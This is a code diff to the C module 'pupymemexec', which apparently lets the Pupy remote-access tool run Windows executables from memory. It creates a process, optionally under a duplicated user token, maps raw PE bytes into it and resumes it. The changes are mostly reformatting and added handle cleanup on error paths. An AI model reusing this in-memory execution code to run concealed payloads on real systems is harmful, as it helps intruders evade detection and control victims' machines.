@@ -24,7 +24,12 @@ static char module_doc[] = "pupymemexec allows pupy to execute PE executables fr
 static PyObject *Py_run_pe_from_memory(PyObject *self, PyObject *args) {
 	PROCESS_INFORMATION pi;
 	STARTUPINFO si;
-	SECURITY_ATTRIBUTES saAttr={ sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };
+	SECURITY_ATTRIBUTES saAttr = {
+		sizeof(SECURITY_ATTRIBUTES),
+		NULL,
+		TRUE
+	};
+
 	HANDLE g_hChildStd_IN_Rd = NULL;
 	HANDLE g_hChildStd_IN_Wr = NULL;
 	HANDLE g_hChildStd_OUT_Rd = NULL;
@@ -50,7 +55,7 @@ static PyObject *Py_run_pe_from_memory(PyObject *self, PyObject *args) {
 		// the address of the handle is directly passed with ctypes
 		return NULL;
 
-	dupHandleAddress = (void **) ((uintptr_t) dupHandleAddressPLL);
+	dupHandleAddress = (void **) ((DWORD_PTR) dupHandleAddressPLL);
 #else
 	PVOID dupHandleAddress = NULL;
 	HANDLE dupHandle = NULL;
@@ -73,13 +78,11 @@ static PyObject *Py_run_pe_from_memory(PyObject *self, PyObject *args) {
 		createFlags |= CREATE_NO_WINDOW;
 	}
 	if(PyObject_IsTrue(py_redirect_stdio)){
-		if(!CreatePipe(&g_hChildStd_IN_Rd, &g_hChildStd_IN_Wr, &saAttr, 0) | !CreatePipe(&g_hChildStd_OUT_Rd, &g_hChildStd_OUT_Wr, &saAttr, 0)){
+		if(!CreatePipe(&g_hChildStd_IN_Rd, &g_hChildStd_IN_Wr, &saAttr, 0) |
+		   !CreatePipe(&g_hChildStd_OUT_Rd, &g_hChildStd_OUT_Wr, &saAttr, 0)) {
 			return PyErr_Format(PyExc_Exception, "Error in CreatePipe: Errno %d", GetLastError());
 		}
-		//if (! SetHandleInformation(g_hChildStd_IN_Wr, HANDLE_FLAG_INHERIT, 0))
-		//	return PyErr_SetFromWindowsErr(0);
-		//if (! SetHandleInformation(g_hChildStd_OUT_Rd, HANDLE_FLAG_INHERIT, 0))
-		//	return PyErr_SetFromWindowsErr(0);
+
 		si.hStdInput  = g_hChildStd_IN_Rd;
 		si.hStdOutput = g_hChildStd_OUT_Wr;
 		si.hStdError  = g_hChildStd_OUT_Wr;
@@ -88,25 +91,49 @@ static PyObject *Py_run_pe_from_memory(PyObject *self, PyObject *args) {
 	}
 
 	if (!dupHandleAddress) {
-		if(!CreateProcess(NULL, cmd_line, &saAttr, NULL, inherit, createFlags, NULL, NULL, &si, &pi)){
+		if(!CreateProcess(NULL, cmd_line, &saAttr, NULL, inherit, createFlags, NULL, NULL, &si, &pi)) {
+			CloseHandle(g_hChildStd_IN_Rd);
+			CloseHandle(g_hChildStd_OUT_Wr);
+
 			return PyErr_Format(PyExc_Exception, "Error in CreateProcess: Errno %d", GetLastError());
 		}
+
 	} else {
 		dupHandle=(HANDLE) dupHandleAddress;
-		if (!CreateProcessAsUser(dupHandle, NULL, cmd_line, &saAttr, NULL, inherit, createFlags, NULL, NULL, &si, &pi)) {
-			return PyErr_Format(PyExc_Exception, "Error in CreateProcess: Errno %d dupHandle %x", GetLastError(), dupHandle);
+		if (!CreateProcessAsUser(dupHandle, NULL, cmd_line, &saAttr,
+								 NULL, inherit, createFlags, NULL, NULL, &si, &pi)) {
+			CloseHandle(g_hChildStd_IN_Rd);
+			CloseHandle(g_hChildStd_OUT_Wr);
+
+			return PyErr_Format(
+				PyExc_Exception, "Error in CreateProcess: Errno %d dupHandle %x", GetLastError(),
+				dupHandle
+			);
 		}
 	}
 
+	CloseHandle(g_hChildStd_IN_Rd);
+	CloseHandle(g_hChildStd_OUT_Wr);
+
 	if (!MapNewExecutableRegionInProcess(pi.hProcess, pi.hThread, pe_raw_bytes)) {
+		TerminateProcess(pi.hProcess, 1);
+		CloseHandle(pi.hProcess);
+		CloseHandle(g_hChildStd_IN_Wr);
+		CloseHandle(g_hChildStd_OUT_Rd);
 		return PyErr_Format(PyExc_Exception, "Error in MapNewExecutableRegionInProcess: Errno %d", GetLastError());
 	}
 
 	if (ResumeThread(pi.hThread) == (DWORD)-1) {
+		TerminateProcess(pi.hProcess, 1);
+		CloseHandle(pi.hProcess);
+		CloseHandle(g_hChildStd_IN_Wr);
+		CloseHandle(g_hChildStd_OUT_Rd);
 		return PyErr_Format(PyExc_Exception, "Error in ResumeThread: Errno %d", GetLastError());
 	}
 
-	return Py_BuildValue("(IIIII)", pi.hProcess, g_hChildStd_IN_Wr, g_hChildStd_OUT_Rd, g_hChildStd_IN_Rd, g_hChildStd_OUT_Wr);
+	CloseHandle(pi.hThread);
+
+	return Py_BuildValue("(III)", pi.hProcess, g_hChildStd_IN_Wr, g_hChildStd_OUT_Rd);
 }
 
 static PyMethodDef methods[] = {
